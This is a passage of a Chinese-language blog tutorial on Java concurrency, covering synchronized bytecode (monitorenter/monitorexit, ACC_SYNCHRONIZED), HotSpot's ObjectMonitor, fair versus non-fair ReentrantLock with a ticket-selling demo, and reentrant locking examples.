class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br></pre></td><td class="code"><pre><span class="line">PS D:\javaProjects\JUC\out\production\JUC&gt; javap -v .\Main.<span class="keyword">class</span></span><br><span class="line"><span class="title class_">Classfile</span> /D:/javaProjects/JUC/out/production/JUC/Main.<span class="keyword">class</span></span><br><span class="line">  <span class="title class_">Last</span> modified <span class="number">2022</span><span class="number">-10</span><span class="number">-6</span>; size <span class="number">844</span> bytes</span><br><span class="line">  MD5 checksum <span class="number">46</span>c192fa8189f98fb511a74313c04ec3</span><br><span class="line">  Compiled from <span class="string">&quot;Main.java&quot;</span>                    </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>                              </span><br><span class="line">  minor version: <span class="number">0</span>                             </span><br><span class="line">  major version: <span class="number">52</span>                            </span><br><span class="line">  flags: ACC_PUBLIC, ACC_SUPER                 </span><br><span class="line">Constant pool:</span><br><span class="line">   #<span class="number">1</span> = Methodref          #<span class="number">2.</span>#<span class="number">28</span>         <span class="comment">// java/lang/Object.&quot;&lt;init&gt;&quot;:()V</span></span><br><span class="line">   #<span class="number">2</span> = Class              #<span class="number">29</span>            <span class="comment">// java/lang/Object</span></span><br><span class="line">   #<span class="number">3</span> = Fieldref           #<span class="number">9.</span>#<span class="number">30</span>         <span class="comment">// Main.o:Ljava/lang/Object;</span></span><br><span class="line">   #<span class="number">4</span> = Fieldref           #<span class="number">31.</span>#<span class="number">32</span>        <span class="comment">// java/lang/System.out:Ljava/io/PrintStream;</span></span><br><span class="line">   #<span class="number">5</span> = String             #<span class="number">33</span>            <span class="comment">// ------hello synchronized m1</span></span><br><span class="line">   #<span class="number">6</span> = Methodref          #<span class="number">34.</span>#<span class="number">35</span>        <span class="comment">// java/io/PrintStream.println:(Ljava/lang/String;)V</span></span><br><span class="line">   #<span class="number">7</span> = String             #<span class="number">36</span>            <span class="comment">// ------hello synchronized m2</span></span><br><span class="line">   #<span class="number">8</span> = String             #<span class="number">37</span>            <span class="comment">// ------hello synchronized m3</span></span><br><span class="line">   #<span class="number">9</span> = Class              #<span class="number">38</span>            <span class="comment">// Main</span></span><br><span class="line">  #<span class="number">10</span> = Utf8               o</span><br><span class="line">  #<span class="number">11</span> = Utf8               Ljava/lang/Object;</span><br><span class="line">  #<span class="number">12</span> = Utf8               &lt;init&gt;</span><br><span class="line">  #<span class="number">13</span> = <span class="built_in">Utf8</span>               ()V</span><br><span class="line">  #<span class="number">14</span> = Utf8               Code</span><br><span class="line">  #<span class="number">15</span> = Utf8               LineNumberTable</span><br><span class="line">  #<span class="number">16</span> = Utf8               LocalVariableTable</span><br><span class="line">  #<span class="number">17</span> = Utf8               <span class="keyword">this</span></span><br><span class="line">  #<span class="number">18</span> = Utf8               LMain;</span><br><span class="line">  #<span class="number">19</span> = Utf8               m1</span><br><span class="line">  #<span class="number">20</span> = Utf8               StackMapTable</span><br><span class="line">  #<span class="number">21</span> = Class              #<span class="number">38</span>            <span class="comment">// Main</span></span><br><span class="line">  #<span class="number">22</span> = Class              #<span class="number">29</span>            <span class="comment">// java/lang/Object</span></span><br><span class="line">  #<span class="number">23</span> = Class              #<span class="number">39</span>            <span class="comment">// java/lang/Throwable</span></span><br><span class="line">  #<span class="number">24</span> = Utf8               m2</span><br><span class="line">  #<span class="number">25</span> = Utf8               m3</span><br><span class="line">  #<span class="number">26</span> = Utf8               SourceFile</span><br><span class="line">  #<span class="number">27</span> = Utf8               Main.java</span><br><span class="line">  #<span class="number">28</span> = NameAndType        #<span class="number">12</span>:#<span class="number">13</span>        <span class="comment">// &quot;&lt;init&gt;&quot;:()V</span></span><br><span class="line">  #<span class="number">29</span> = Utf8               java/lang/Object</span><br><span class="line">  #<span class="number">30</span> = NameAndType        #<span class="number">10</span>:#<span class="number">11</span>        <span class="comment">// o:Ljava/lang/Object;</span></span><br><span class="line">  #<span class="number">31</span> = Class              #<span class="number">40</span>            <span class="comment">// java/lang/System</span></span><br><span class="line">  #<span class="number">32</span> = NameAndType        #<span class="number">41</span>:#<span class="number">42</span>        <span class="comment">// out:Ljava/io/PrintStream;</span></span><br><span class="line">  #<span class="number">33</span> = Utf8               ------hello <span class="keyword">synchronized</span> m1</span><br><span class="line">  #<span class="number">34</span> = Class              #<span class="number">43</span>            <span class="comment">// java/io/PrintStream</span></span><br><span class="line">  #<span class="number">35</span> = NameAndType        #<span class="number">44</span>:#<span class="number">45</span>        <span class="comment">// println:(Ljava/lang/String;)V</span></span><br><span class="line">  #<span class="number">36</span> = Utf8               ------hello <span class="keyword">synchronized</span> m2</span><br><span class="line">  #<span class="number">37</span> = Utf8               ------hello <span class="keyword">synchronized</span> m3</span><br><span class="line">  #<span class="number">38</span> = Utf8               Main</span><br><span class="line">  #<span class="number">39</span> = Utf8               java/lang/Throwable</span><br><span class="line">  #<span class="number">40</span> = Utf8               java/lang/System</span><br><span class="line">  #<span class="number">41</span> = Utf8               out</span><br><span class="line">  #<span class="number">42</span> = Utf8               Ljava/io/PrintStream;</span><br><span class="line">  #<span class="number">43</span> = Utf8               java/io/PrintStream</span><br><span class="line">  #<span class="number">44</span> = Utf8               println</span><br><span class="line">  #<span class="number">45</span> = <span class="built_in">Utf8</span>               (Ljava/lang/String;)V</span><br><span class="line">&#123;</span><br><span class="line">  java.lang.Object o;</span><br><span class="line">    descriptor: Ljava/lang/Object;</span><br><span class="line">    flags:</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">Main</span><span class="params">()</span></span>;</span><br><span class="line">    descriptor: ()V</span><br><span class="line">    flags: ACC_PUBLIC</span><br><span class="line">    Code:</span><br><span class="line">      stack=<span class="number">3</span>, locals=<span class="number">1</span>, args_size=<span class="number">1</span></span><br><span class="line">         <span class="number">0</span>: aload_0</span><br><span class="line">         <span class="number">1</span>: invokespecial #<span class="number">1</span>                  <span class="comment">// Method java/lang/Object.&quot;&lt;init&gt;&quot;:()V</span></span><br><span class="line">         <span class="number">4</span>: aload_0</span><br><span class="line">         <span class="number">5</span>: <span class="keyword">new</span>           #<span class="number">2</span>                  <span class="comment">// class java/lang/Object</span></span><br><span class="line">         <span class="number">8</span>: dup</span><br><span class="line">         <span class="number">9</span>: invokespecial #<span class="number">1</span>                  <span class="comment">// Method java/lang/Object.&quot;&lt;init&gt;&quot;:()V</span></span><br><span class="line">        <span class="number">12</span>: putfield      #<span class="number">3</span>                  <span class="comment">// Field o:Ljava/lang/Object;</span></span><br><span class="line">        <span class="number">15</span>: <span class="keyword">return</span></span><br><span class="line">      LineNumberTable:</span><br><span class="line">        line <span class="number">1</span>: <span class="number">0</span></span><br><span class="line">        line <span class="number">2</span>: <span class="number">4</span></span><br><span class="line">      LocalVariableTable:</span><br><span class="line">        Start  Length  Slot  Name   Signature</span><br><span class="line">            <span class="number">0</span>      <span class="number">16</span>     <span class="number">0</span>  <span class="keyword">this</span>   LMain;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="type">void</span> <span class="title">m1</span><span class="params">()</span></span>;</span><br><span class="line">    descriptor: ()V</span><br><span class="line">    flags: ACC_PUBLIC</span><br><span class="line">    Code:</span><br><span class="line">      stack=<span class="number">2</span>, locals=<span class="number">3</span>, args_size=<span class="number">1</span></span><br><span class="line">         <span class="number">0</span>: aload_0</span><br><span class="line">         <span class="number">1</span>: getfield      #<span class="number">3</span>                  <span class="comment">// Field o:Ljava/lang/Object;</span></span><br><span class="line">         <span class="number">4</span>: dup</span><br><span class="line">         <span class="number">5</span>: astore_1</span><br><span class="line">         <span class="number">6</span>: monitorenter</span><br><span class="line">         <span class="number">7</span>: getstatic     #<span class="number">4</span>                  <span class="comment">// Field java/lang/System.out:Ljava/io/PrintStream;</span></span><br><span class="line">        <span class="number">10</span>: ldc           #<span class="number">5</span>                  <span class="comment">// String ------hello synchronized m1</span></span><br><span class="line">        <span class="number">12</span>: invokevirtual #<span class="number">6</span>                  <span class="comment">// Method java/io/PrintStream.println:(Ljava/lang/String;)V</span></span><br><span class="line">        <span class="number">15</span>: aload_1</span><br><span class="line">        <span class="number">16</span>: monitorexit</span><br><span class="line">        <span class="number">17</span>: <span class="keyword">goto</span>          <span class="number">25</span></span><br><span class="line">        <span class="number">20</span>: astore_2</span><br><span class="line">        <span class="number">21</span>: aload_1</span><br><span class="line">        <span class="number">22</span>: monitorexit</span><br><span class="line">        <span class="number">23</span>: aload_2</span><br><span class="line">        <span class="number">24</span>: athrow</span><br><span class="line">        <span class="number">25</span>: <span class="keyword">return</span></span><br><span class="line">      Exception table:</span><br><span class="line">         from    to  target type</span><br><span class="line">             <span class="number">7</span>    <span class="number">17</span>    <span class="number">20</span>   any</span><br><span class="line">            <span class="number">20</span>    <span class="number">23</span>    <span class="number">20</span>   any</span><br><span class="line">      LineNumberTable:</span><br><span class="line">        line <span class="number">5</span>: <span class="number">0</span></span><br><span class="line">        line <span class="number">6</span>: <span class="number">7</span></span><br><span class="line">        line <span class="number">7</span>: <span class="number">15</span></span><br><span class="line">        line <span class="number">8</span>: <span class="number">25</span></span><br><span class="line">      LocalVariableTable:</span><br><span class="line">        Start  Length  Slot  Name   Signature</span><br><span class="line">            <span class="number">0</span>      <span class="number">26</span>     <span class="number">0</span>  <span class="keyword">this</span>   LMain;</span><br><span class="line">      StackMapTable: number_of_entries = <span class="number">2</span></span><br><span class="line">        frame_type = <span class="number">255</span> <span class="comment">/* full_frame */</span></span><br><span class="line">          offset_delta = <span class="number">20</span></span><br><span class="line">          locals = [ <span class="keyword">class</span> Main, <span class="keyword">class</span> java/lang/Object ]</span><br><span class="line">          stack = [ <span class="keyword">class</span> java/lang/Throwable ]</span><br><span class="line">        frame_type = <span class="number">250</span> <span class="comment">/* chop */</span></span><br><span class="line">          offset_delta = <span class="number">4</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="type">void</span> <span class="built_in">m2</span>();</span><br><span class="line">    descriptor: ()V</span><br><span class="line">    flags: ACC_PUBLIC, ACC_SYNCHRONIZED</span><br><span class="line">    Code:</span><br><span class="line">      stack=<span class="number">2</span>, locals=<span class="number">1</span>, args_size=<span class="number">1</span></span><br><span class="line">         <span class="number">0</span>: getstatic     #<span class="number">4</span>                  <span class="comment">// Field java/lang/System.out:Ljava/io/PrintStream;</span></span><br><span class="line">         <span class="number">3</span>: ldc           #<span class="number">7</span>                  <span class="comment">// String ------hello synchronized m2</span></span><br><span class="line">         <span class="number">5</span>: invokevirtual #<span class="number">6</span>                  <span class="comment">// Method java/io/PrintStream.println:(Ljava/lang/String;)V</span></span><br><span class="line">         <span class="number">8</span>: <span class="keyword">return</span></span><br><span class="line">      LineNumberTable:</span><br><span class="line">        line <span class="number">11</span>: <span class="number">0</span></span><br><span class="line">        line <span class="number">12</span>: <span class="number">8</span></span><br><span class="line">      LocalVariableTable:</span><br><span class="line">        Start  Length  Slot  Name   Signature</span><br><span class="line">            <span class="number">0</span>       <span class="number">9</span>     <span class="number">0</span>  <span class="keyword">this</span>   LMain;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="type">static</span> <span class="keyword">synchronized</span> <span class="type">void</span> <span class="title">m3</span><span class="params">()</span></span>;</span><br><span class="line">    descriptor: ()V</span><br><span class="line">    flags: ACC_PUBLIC, ACC_STATIC, ACC_SYNCHRONIZED</span><br><span class="line">    Code:</span><br><span class="line">      stack=<span class="number">2</span>, locals=<span class="number">0</span>, args_size=<span class="number">0</span></span><br><span class="line">         <span class="number">0</span>: getstatic     #<span class="number">4</span>                  <span class="comment">// Field java/lang/System.out:Ljava/io/PrintStream;</span></span><br><span class="line">         <span class="number">3</span>: ldc           #<span class="number">8</span>                  <span class="comment">// String ------hello synchronized m3</span></span><br><span class="line">         <span class="number">5</span>: invokevirtual #<span class="number">6</span>                  <span class="comment">// Method java/io/PrintStream.println:(Ljava/lang/String;)V</span></span><br><span class="line">         <span class="number">8</span>: <span class="keyword">return</span></span><br><span class="line">      LineNumberTable:</span><br><span class="line">        line <span class="number">15</span>: <span class="number">0</span></span><br><span class="line">        line <span class="number">16</span>: <span class="number">8</span></span><br><span class="line">&#125;</span><br><span class="line">SourceFile: <span class="string">&quot;Main.java&quot;</span></span><br></pre></td></tr></table></figure><p>总结：</p><ul><li>synchronized同步代码块，实现使用的是<code>moniterenter</code>和<code>moniterexit</code>指令<ul><li>如果同步代码块中出现Exception或者Error，则会调用第二个<code>monitorexit</code>指令来保证释放锁。</li><li>如果主动throw一个RuntimeException，一个enter对应一个exit</li></ul></li><li>synchronized普通同步方法，调用指令将会检查方法的<code>ACC_SYNCHRONIZED</code>访问标志是否被设置。如果设置了，执行线程会将先持有monitor然后再执行方法，最后在方法完成(无论是正常完成还是非正常完成)时释放 monitor。</li><li>synchronized静态同步方法，<code>ACC_STATIC</code>, <code>ACC_SYNCHRONIZED</code>访问标志区分该方法是否静态同步方法</li></ul><h2 id="管程"><a href="#管程" class="headerlink" title="管程"></a>管程</h2><p>管程：Monitor（监视器），也就是我们平时说的锁，监视器锁。</p><p>管程是一种程序结构，结构内的多个子程序（对象或模块）形成的多个工作线程互斥访问共享资源。这些共享资源一般是硬件设备或一群变量。对共享变量能够进行的所有操作集中在一个模块中（把信号量及其操作原语“封装”在一个对象内部）。管程实现了在一个时间点，最多只有一个线程在执行管程的某个子程序。管程提供了一种机制，管程可以看做一个软件模块，它是将共享的变量和对于这些共享变量的操作封装起来，形成一个具有一定接口的功能模块，进程可以调用管程来实现进程级别的并发控制。</p><p>执行线程就要求先成功持有管程，然后才能执行方法，最后当方法完成（无论是正常完成还是非正常完成）时释放管程。在方法执行期间，执行线程持有了管程，其他任何线程都无法再获取到同一个管程。</p><h2 id="ObjectMonitor"><a href="#ObjectMonitor" class="headerlink" title="ObjectMonitor"></a>ObjectMonitor</h2><p>为什么任何一个对象都可以成为一个锁？</p><ul><li><p>Java <code>Object</code> 类是所有类的父类，<strong>子类可以使用 Object 的所有方法</strong>。而Object的wait，nofity方法的底层支持实现是<code>ObjectMonitor</code>，它也实现锁控制。所以每个对象天生都带着一个<strong>对象监视器</strong>ObjectMonitor。</p></li><li><p>在HotSpot虚拟机中，monitor采用ObjectMonitor实现：ObjectMonitor.java<code>→</code>ObjectMonitor.cpp<code>→</code>objectMonitor.hpp</p></li></ul><hr><p>ObjectMonitor.cpp 中引入了头文件（include）objectMonitor.hpp</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">140</span>行</span><br><span class="line">  <span class="built_in">ObjectMonitor</span>() &#123;</span><br><span class="line">    _header       = <span class="literal">NULL</span>;</span><br><span class="line">    _count        = <span class="number">0</span>; <span class="comment">//用来记录该线程获取锁的次数</span></span><br><span class="line">    _waiters      = <span class="number">0</span>,</span><br><span class="line">    _recursions   = <span class="number">0</span>;<span class="comment">//锁的重入次数</span></span><br><span class="line">    _object       = <span class="literal">NULL</span>;</span><br><span class="line">    _owner        = <span class="literal">NULL</span>; <span class="comment">//------最重要的----指向持有ObjectMonitor对象的线程，记录哪个线程持有了我</span></span><br><span class="line">    _WaitSet      = <span class="literal">NULL</span>; <span class="comment">//存放处于wait状态的线程队列</span></span><br><span class="line">    _WaitSetLock  = <span class="number">0</span> ;</span><br><span class="line">    _Responsible  = <span class="literal">NULL</span> ;</span><br><span class="line">    _succ         = <span class="literal">NULL</span> ;</span><br><span class="line">    _cxq          = <span class="literal">NULL</span> ;</span><br><span class="line">    FreeNext      = <span class="literal">NULL</span> ;</span><br><span class="line">    _EntryList    = <span class="literal">NULL</span> ;<span class="comment">//存放处于等待锁block状态的线程队列</span></span><br><span class="line">    _SpinFreq     = <span class="number">0</span> ;</span><br><span class="line">    _SpinClock    = <span class="number">0</span> ;</span><br><span class="line">    OwnerIsThread = <span class="number">0</span> ;</span><br><span class="line">    _previous_owner_tid = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h1 id="公平锁和非公平锁"><a href="#公平锁和非公平锁" class="headerlink" title="公平锁和非公平锁"></a>公平锁和非公平锁</h1><p><strong>非公平锁</strong>是指多个线程获取锁的顺序并不是按照申请锁的顺序，有可能后申请的线程比先申请的线程优先获取锁，在高并发环境下，有可能造成优先级翻转或<strong>饥饿的状态</strong>（某个线程一直得不到锁）。</p><p><strong>公平锁</strong>是指多个线程按照<strong>申请锁的顺序</strong>来获取锁。</p><blockquote><p>按序排队公平锁，就是判断同步队列是否还有先驱节点的存在，如果没有先驱节点才能获取锁；<br>先占先得非公平锁，是不管这个事的，只要能抢获到同步状态就可以</p></blockquote><hr><p><strong>ReentrantLock抢票案例：</strong></p><p>ReentrantLock默认是非公平锁，运行后可以看到每个线程买票的数量不均匀，甚至有的线程没有卖到票；</p><p>传入true参数则是公平锁，卖票一开始是a占优，后面像a b c a b c a b c这样均匀分布。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Ticket</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="variable">number</span> <span class="operator">=</span> <span class="number">30</span>;</span><br><span class="line">    <span class="type">ReentrantLock</span> <span class="variable">lock</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReentrantLock</span>();</span><br><span class="line">    <span class="comment">//ReentrantLock lock = new ReentrantLock(true);</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sale</span><span class="params">()</span> &#123;</span><br><span class="line">        lock.lock();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (number &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                System.out.println(Thread.currentThread().getName() + <span class="string">&quot;卖出第：\t&quot;</span> + (number--) + <span class="string">&quot;\t 还剩下:&quot;</span> + number);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            lock.unlock();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Ticket</span> <span class="variable">ticket</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Ticket</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">35</span>; i++) ticket.sale();</span><br><span class="line">        &#125;, <span class="string">&quot;a&quot;</span>).start();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">35</span>; i++) ticket.sale();</span><br><span class="line">        &#125;, <span class="string">&quot;b&quot;</span>).start();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">35</span>; i++) ticket.sale();</span><br><span class="line">        &#125;, <span class="string">&quot;c&quot;</span>).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><p>为什么会有公平锁&#x2F;非公平锁的设计？为什么默认是非公平？什么时候用公平和用非公平？</p><ol><li><p>恢复挂起的线程到真正锁的获取还是有时间差的，从开发人员来看这个时间微乎其微，但是从CPU的角度来看，这个时间差存在的还是很明显的。所以<strong>非公平锁能更充分的利用CPU 的时间片，尽量减少 CPU 空闲状态时间</strong>。</p></li><li><p>使用多线程很重要的考量点是<strong>线程切换的开销</strong>，当采用非公平锁时，当1个线程请求锁获取同步状态，然后释放同步状态，因为不需要考虑是否还有前驱节点，所以刚释放锁的线程在此刻再次获取同步状态的概率就变得非常大，所以就减少了线程的开销。</p></li><li><p>如果为了更高的吞吐量，很显然非公平锁是比较合适的，因为节省很多线程切换时间，吞吐量自然就上去了；否则那就用公平锁，大家公平使用。</p></li></ol><h1 id="可重入锁"><a href="#可重入锁" class="headerlink" title="可重入锁"></a>可重入锁</h1><p>可重入锁又名递归锁，是指在同一个线程在外层方法获取锁的时候，再进入该线程的内层方法会自动获取锁(前提，<strong>锁对象得是同一个对象</strong>)，不会因为之前已经获取过还没释放而阻塞。</p><p>如果是1个有 synchronized 修饰的递归调用方法，程序第2次进入被自己阻塞了岂不是天大的笑话，出现了作茧自缚。</p><p>所以Java中<strong>ReentrantLock和synchronized都是可重入锁</strong>，可重入锁的一个优点是可一定程度<strong>避免死锁</strong>。</p><h2 id="隐式锁Synchronized"><a href="#隐式锁Synchronized" class="headerlink" title="隐式锁Synchronized"></a>隐式锁Synchronized</h2><p>隐式锁（即synchronized关键字使用的锁）默认是可重入锁。</p><p>同步代码块：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Object</span> <span class="variable">objectLockA</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            <span class="keyword">synchronized</span> (objectLockA)</span><br><span class="line">            &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;-----外层调用&quot;</span>);</span><br><span class="line">                <span class="keyword">synchronized</span> (objectLockA)</span><br><span class="line">                &#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;-----中层调用&quot;</span>);</span><br><span class="line">                    <span class="keyword">synchronized</span> (objectLockA)</span><br><span class="line">                    &#123;</span><br><span class="line">                        System.out.println(<span class="string">&quot;-----内层调用&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,<span class="string">&quot;a&quot;</span>).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同步方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ReEntryLockDemo</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">m1</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;-----m1&quot;</span>);</span><br><span class="line">        m2();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">m2</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;-----m2&quot;</span>);</span><br><span class="line">        m3();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">m3</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;-----m3&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">ReEntryLockDemo</span> <span class="variable">reEntryLockDemo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReEntryLockDemo</span>();</span><br><span class="line"></span><br><span class="line">        reEntryLockDemo.m1();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 